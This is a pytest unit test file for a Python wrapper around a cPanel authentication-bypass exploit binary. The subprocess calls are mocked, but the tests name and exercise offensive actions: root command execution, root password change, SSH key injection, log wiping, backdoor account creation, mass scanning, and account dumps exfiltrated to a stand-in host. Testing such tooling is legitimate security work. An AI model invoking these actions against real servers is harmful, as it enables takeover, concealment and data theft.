"""Hermetic contracts for the cPanel wrapper and plugin adapter."""

from __future__ import annotations

import json
import subprocess
from types import SimpleNamespace

import pytest

from core.plugins.base import PluginContext
from modules.exploits import cpanel_auth_bypass as cpanel

pytestmark = [pytest.mark.unit, pytest.mark.security]


def test_find_binary_prefers_packaged_candidates_and_then_path(monkeypatch) -> None:
    chmod_calls = []
    monkeypatch.setattr(
        cpanel.os.path,
        "isfile",
        lambda path: "linux_arm64" in path,
    )
    monkeypatch.setattr(cpanel.os, "chmod", lambda path, mode: chmod_calls.append((path, mode)))

    selected = cpanel._find_binary()

    assert "linux_arm64" in selected
    assert chmod_calls == [(selected, 0o755)]

    monkeypatch.setattr(cpanel.os.path, "isfile", lambda _path: False)
    monkeypatch.setattr(
        cpanel.shutil,
        "which",
        lambda executable: "/usr/local/bin/cpanel_sniper" if executable == "cpanel_sniper" else None,
    )
    assert cpanel._find_binary() == "/usr/local/bin/cpanel_sniper"


def test_find_binary_builds_from_source_and_reports_build_failures(monkeypatch, capsys) -> None:
    built = False
    chmod_calls = []

    def isfile(path: str) -> bool:
        return path.endswith("main.go") or (built and path.endswith("cpanel_sniper"))

    def run(command, **kwargs):
        nonlocal built
        built = True
        return subprocess.CompletedProcess(command, 0, stdout="", stderr="")

    monkeypatch.setattr(cpanel.os.path, "isfile", isfile)
    monkeypatch.setattr(cpanel.shutil, "which", lambda executable: "go" if executable == "go" else None)
    monkeypatch.setattr(cpanel.subprocess, "run", run)
    monkeypatch.setattr(cpanel.os, "chmod", lambda path, mode: chmod_calls.append((path, mode)))

    selected = cpanel._find_binary()

    assert selected.endswith("vendor/cpanel_sniper/cpanel_sniper")
    assert chmod_calls == [(selected, 0o755)]
    assert "Built:" in capsys.readouterr().out

    for return_code in (1, 0):
        monkeypatch.setattr(cpanel.os.path, "isfile", lambda path: path.endswith("main.go"))
        monkeypatch.setattr(
            cpanel.subprocess,
            "run",
            lambda command, _return_code=return_code, **kwargs: SimpleNamespace(
                returncode=_return_code,
                stderr="compile failed",
            ),
        )
        with pytest.raises(FileNotFoundError, match="cpanel_sniper not found"):
            cpanel._find_binary()
        assert "Build failed" in capsys.readouterr().out


def test_find_binary_fails_when_source_or_go_is_unavailable(monkeypatch) -> None:
    monkeypatch.setattr(cpanel.os.path, "isfile", lambda _path: False)
    monkeypatch.setattr(cpanel.shutil, "which", lambda _executable: None)
    with pytest.raises(FileNotFoundError, match="go build"):
        cpanel._find_binary()

    monkeypatch.setattr(cpanel.os.path, "isfile", lambda path: path.endswith("main.go"))
    with pytest.raises(FileNotFoundError, match="go build"):
        cpanel._find_binary()


def test_run_binary_parses_full_structured_output_and_json_artifact(
    monkeypatch,
    tmp_path,
) -> None:
    artifact = tmp_path / "results.json"
    artifact.write_text('{"verified":true}', encoding="utf-8")
    stdout = """
\x1b[92mVULNERABLE\x1b[0m
Token: token-1
Version: 11.2
Session: cpsess123
API URL: https://host/api
Hostname: host.example
User: alice | Domain: example.test
[→] uid=0(root)
{"reason":"command complete"}
Command Output: legacy output
---
[CMD] HTTP 200
Total Targets Scanned: 12
Vulnerable Targets: 3
"""
    monkeypatch.setattr(cpanel, "_find_binary", lambda: "/fixture/cpanel_sniper")
    monkeypatch.setattr(cpanel.time, "time", iter((10.0, 11.234)).__next__)
    monkeypatch.setattr(
        cpanel.subprocess,
        "run",
        lambda command, **kwargs: SimpleNamespace(
            stdout=stdout,
            stderr="",
            returncode=0,
        ),
    )

    result = cpanel._run_binary(
        ["-u", "https://host:2087", "-action", "cmd", "-cmd", "id", "-o", str(artifact)],
        timeout=30,
    )

    assert result["status"] == "vulnerable"
    assert result["elapsed_s"] == 1.23
    assert result["token"] == "token-1"
    assert result["version"] == "11.2"
    assert result["session"] == "cpsess123"
    assert result["api_url"] == "https://host/api"
    assert result["hostname"] == "host.example"
    assert result["accounts"] == [{"user": "alice", "domain": "example.test"}]
    assert result["cmd_output"] == "uid=0(root)\ncommand complete\nlegacy output"
    assert result["cmd_http_status"] == 200
    assert result["total_scanned"] == 12
    assert result["total_vulnerable"] == 3
    assert result["json_results"] == {"verified": True}


@pytest.mark.parametrize(
    ("stdout", "return_code", "expected"),
    [
        ("target is NOT VULNERABLE", 0, "not_vulnerable"),
        ("no classification", 2, "not_vulnerable"),
        ("no classification", 0, "unknown"),
    ],
)
def test_run_binary_classifies_non_vulnerable_and_unknown_outputs(
    monkeypatch,
    stdout: str,
    return_code: int,
    expected: str,
) -> None:
    monkeypatch.setattr(cpanel, "_find_binary", lambda: "/fixture/cpanel_sniper")
    monkeypatch.setattr(cpanel.time, "time", lambda: 1.0)
    monkeypatch.setattr(
        cpanel.subprocess,
        "run",
        lambda command, **kwargs: SimpleNamespace(
            stdout=stdout,
            stderr="stderr",
            returncode=return_code,
        ),
    )
    assert cpanel._run_binary(["-u", "host"])["status"] == expected


def test_run_binary_contains_invalid_optional_json_and_subprocess_errors(
    monkeypatch,
    tmp_path,
    caplog,
) -> None:
    invalid = tmp_path / "invalid.json"
    invalid.write_text("not-json", encoding="utf-8")
    missing = tmp_path / "missing.json"
    monkeypatch.setattr(cpanel, "_find_binary", lambda: "/fixture/cpanel_sniper")
    monkeypatch.setattr(cpanel.time, "time", lambda: 1.0)
    monkeypatch.setattr(
        cpanel.subprocess,
        "run",
        lambda command, **kwargs: SimpleNamespace(stdout="", stderr="", returncode=0),
    )
    with caplog.at_level("DEBUG"):
        result = cpanel._run_binary([str(invalid), str(missing), "plain-output"])
    assert result["status"] == "unknown"
    assert "json_results" not in result
    assert "Suppressed" in caplog.text

    errors = [
        (subprocess.TimeoutExpired("fixture", 9), "timeout"),
        (FileNotFoundError("binary missing"), "error"),
        (RuntimeError("execution failed"), "error"),
    ]
    for exception, status in errors:
        monkeypatch.setattr(
            cpanel.subprocess,
            "run",
            lambda *_args, _exception=exception, **_kwargs: (_ for _ in ()).throw(_exception),
        )
        outcome = cpanel._run_binary(["-u", "host"], timeout=9)
        assert outcome["status"] == status
        assert outcome.get("error")


def test_sniper_builds_scan_exploit_mass_and_shortcut_arguments(monkeypatch) -> None:
    calls = []
    monkeypatch.setattr(
        cpanel,
        "_run_binary",
        lambda args, timeout=60: calls.append((args, timeout)) or {"args": args},
    )
    sniper = cpanel.CpanelSniper()

    sniper.scan("host", timeout=31)
    sniper.scan("https://host:2087", verbose=True)
    sniper.check("host", port=2096)
    sniper.exploit("host", timeout=32)
    sniper.exploit(
        "host",
        "adduser",
        cmd="whoami",
        passwd="pw",
        new_user="new",
        new_domain="example.test",
        tokenname="token",
        sshkey="ssh-rsa fixture",
        dumpuser="account",
        exfil="https://sink.test",
        verbose=True,
    )
    sniper.mass_scan("targets.txt")
    sniper.mass_scan("targets.txt", threads=50, action="scan", output="out.json", timeout=601)
    sniper.list_accounts("host")
    sniper.exec_cmd("host", "id")
    sniper.server_info("host")
    sniper.inject_sshkey("host", "key")
    sniper.create_apitoken("host")
    sniper.change_root_passwd("host", "pw")
    sniper.wipe_logs("host")
    sniper.dump_account("host", "alice", "https://sink.test")
    sniper.create_backdoor("host", "user", "example.test")

    assert calls[0] == (["-u", "https://host:2087"], 31)
    assert calls[1][0][-1] == "--verbose"
    assert calls[2][0] == ["-u", "https://host:2096"]
    full_exploit = calls[4][0]
    assert all(
        flag in full_exploit
        for flag in (
            "-cmd",
            "-passwd",
            "-new-user",
            "-new-domain",
            "-tokenname",
            "-sshkey",
            "-dumpuser",
            "-exfil",
            "--verbose",
        )
    )
    assert calls[5][0] == ["-l", "targets.txt", "-t", "20"]
    assert calls[6] == (
        ["-l", "targets.txt", "-t", "50", "-action", "scan", "-o", "out.json"],
        601,
    )
    assert cpanel.CpanelAuthBypass is cpanel.CpanelSniper


@pytest.mark.parametrize(
    ("target", "port", "expected"),
    [
        (" host ", None, "https://host:2087"),
        ("http://host", None, "http://host:2087"),
        ("https://host:2096", None, "https://host:2096"),
        ("host", 2096, "https://host:2096"),
        ("https://host:2096", 2096, "https://host:2096"),
    ],
)
def test_sniper_normalizes_targets(target: str, port: int | None, expected: str) -> None:
    assert cpanel.CpanelSniper._norm(target, port) == expected


@pytest.mark.parametrize(
    ("result", "vulnerable", "details", "evidence"),
    [
        (
            {"status": "vulnerable", "raw_output": "confirmed", "version": "11", "session": "session"},
            True,
            "confirmed",
            "session",
        ),
        (
            {"status": "not_vulnerable", "error": "denied", "token": "token"},
            False,
            "denied",
            "token",
        ),
        ({"status": "unknown"}, False, "unknown", ""),
    ],
)
def test_plugin_check_projects_each_result_shape(
    monkeypatch,
    result: dict,
    vulnerable: bool,
    details: str,
    evidence: str,
) -> None:
    monkeypatch.setattr(cpanel.CpanelSniper, "check", lambda self, target, port=2087: result)
    checked = cpanel.CpanelAuthBypassPlugin().check("host", port="2096")

    assert checked.vulnerable is vulnerable
    assert checked.confidence == (1.0 if vulnerable else 0.0)
    assert checked.details == details
    assert checked.evidence == evidence


def test_plugin_run_requires_target_gates_exploit_and_projects_session(monkeypatch) -> None:
    plugin = cpanel.CpanelAuthBypassPlugin()
    assert plugin.run().error == "target is required"

    plugin.setup(PluginContext(target="context-host"))
    monkeypatch.setattr(
        cpanel.CpanelSniper,
        "scan",
        lambda self, target, timeout=60, verbose=False: {
            "status": "vulnerable",
            "session": "cpsess123",
            "api_url": "https://host/api",
        },
    )
    scan = plugin.run(action="check", timeout="31")
    assert scan.success is True
    assert scan.sessions == [
        {
            "type": "cpanel",
            "target": "context-host",
            "session": "cpsess123",
            "api_url": "https://host/api",
        }
    ]
    assert json.loads(scan.output)["status"] == "vulnerable"

    denied = plugin.run(target="explicit", action="cmd")
    assert "allow_exploit=True" in denied.error

    exploit_calls = []
    monkeypatch.setattr(
        cpanel.CpanelSniper,
        "exploit",
        lambda self, target, **kwargs: (
            exploit_calls.append((target, kwargs))
            or {"status": "error", "error": "failed"}
        ),
    )
    exploited = plugin.run(
        target="explicit",
        action="cmd",
        cmd="id",
        timeout=32,
        allow_exploit=True,
    )
    assert exploited.success is False
    assert exploited.sessions == []
    assert exploited.error == "failed"
    assert exploit_calls == [
        ("explicit", {"action": "cmd", "cmd": "id", "timeout": 32})
    ]
